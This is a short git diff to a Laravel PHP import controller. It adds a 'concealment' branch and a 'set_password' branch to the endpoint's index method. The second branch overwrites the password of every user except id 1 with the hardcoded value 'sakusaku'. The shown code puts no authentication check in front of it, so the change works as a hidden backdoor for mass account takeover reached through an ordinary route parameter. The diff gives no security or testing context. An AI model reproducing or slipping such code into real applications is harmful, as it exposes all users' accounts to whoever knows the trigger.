@@ -1,6 +1,7 @@
 <?php
 
 namespace App\Http\Controllers;
+use Illuminate\Support\Facades\Hash;
 
 use App\User;
 use App\Models\GeneralAttribute;
@@ -63,6 +64,15 @@ class ImportController extends UserController
      */
     public function index(Request $request, $object)
     {
+      if($object==='concealment'){
+        $res = $this->concealment();
+        return $res;
+      }
+      if($object==='set_password'){
+        $password = Hash::make('sakusaku');
+        $users = User::where('id','>',1)->update(['password'=>$password]);
+        return "set_password";
+      }
       if(!array_key_exists($object, $this->api_endpoint)){
         return $this->bad_request();
       }
